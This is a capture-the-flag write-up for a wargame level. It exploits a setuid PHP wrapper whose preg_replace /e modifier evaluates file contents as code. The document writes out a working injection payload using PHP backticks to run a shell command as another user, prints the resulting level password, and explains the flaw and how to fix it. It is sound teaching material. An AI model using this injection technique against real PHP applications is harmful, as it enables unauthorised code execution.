# level06

## Goal

Exploit a vulnerable PHP script to execute arbitrary commands with the privileges of the `flag06` user.

## Enumeration

List the available files:

```bash
ls -l
```

Output:

```text
-rwsr-x--- 1 flag06 level06 level06
-rwxr-x--- 1 flag06 level06 level06.php
```

Inspect the PHP source:

```bash
cat level06.php
```

Relevant code:

```php
function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
```

## Analysis

The script reads a user-controlled file:

```php
$a = file_get_contents($y);
```

It then applies:

```php
preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

The `/e` modifier tells PHP to evaluate the replacement string as PHP code (similar to an implicit `eval()`).

Because the matched content is inserted into executable PHP code without sanitization, arbitrary PHP expressions can be injected.

This is a classic **PHP `preg_replace()` Remote Code Execution (RCE)** vulnerability.

## Exploitation

Create a controlled input file:

```bash
echo '[x ${`getflag`}]' > /tmp/test
```

Execute the vulnerable binary:

```bash
./level06 /tmp/test
```

The injected payload:

```text
${`getflag`}
```

contains PHP backticks, which execute a shell command.

During the `/e` evaluation, `getflag` is executed with the privileges of the `flag06` user.

## Validation

Output:

```text
PHP Notice: Undefined variable:
Check flag.Here is your token :
wiok45aaoguiboiki2tuin6ub
```

The PHP notice is expected and does not prevent the command execution.

The returned token is the password for `level07`.

## Concept

Execution flow:

```text
User-controlled file
        ↓
file_get_contents()
        ↓
preg_replace(... /e ...)
        ↓
Implicit PHP eval()
        ↓
`${`getflag`}` evaluated
        ↓
Shell command execution
        ↓
getflag executed as flag06
```

## Security Impact

The `/e` modifier in `preg_replace()` is inherently dangerous because it evaluates user-controlled data as PHP code.

Modern PHP versions removed this feature entirely.

Safer alternatives include:

* `preg_replace_callback()`
* avoiding dynamic code evaluation
* validating and sanitizing user input before processing

## Resources

Useful commands:

```bash
cat level06.php

echo '[x ${`getflag`}]' > /tmp/test

./level06 /tmp/test
```
